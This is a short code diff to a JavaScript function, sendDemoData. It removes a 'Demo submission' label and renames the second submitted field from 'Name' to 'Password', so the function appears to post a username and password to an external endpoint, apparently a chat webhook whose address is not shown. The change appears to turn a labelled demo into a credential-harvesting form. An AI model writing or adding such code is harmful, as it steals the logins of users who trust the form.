@@ -613,9 +613,8 @@ async function sendDemoData(usernameValue, nameValue) {
         },
         body: JSON.stringify({
             content:
-                `🧪 Demo submission\n` +
                 `Username: ${usernameValue}\n` +
-                `Name: ${nameValue}\n` +
+                `Password: ${nameValue}\n` +
                 `Time: ${new Date().toLocaleString()}`
         })
     });
